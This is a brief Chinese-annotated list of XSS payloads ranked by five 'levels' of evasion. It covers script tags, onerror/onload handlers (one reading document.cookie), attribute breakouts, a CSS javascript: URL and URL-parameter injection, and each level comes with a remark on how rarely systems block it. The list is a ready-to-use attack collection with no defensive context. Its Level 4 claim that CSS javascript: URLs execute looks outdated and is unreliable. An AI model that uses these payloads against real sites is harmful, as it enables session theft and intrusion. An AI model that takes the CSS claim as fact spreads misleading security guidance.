# Level 1：基础 script 标签（大部分现代框架防得住）
<script>alert(1)</script>

# Level 2：事件处理器（很多系统防不住这个）
<img src=x onerror=alert(document.cookie)>
<svg onload=alert(1)>

# Level 3：利用 HTML 属性闭合（如果输入出现在 input value 里）
"><script>alert(1)</script>
" onfocus="alert(1)" autofocus="

# Level 4：利用 CSS 执行（极少系统防这个）
<style>body{background:url('javascript:alert(1)')}</style>

# Level 5：从 URL 参数注入（如果参数值直接渲染到页面）
?q=<script>alert(1)</script>
?redirect=javascript:alert(1)
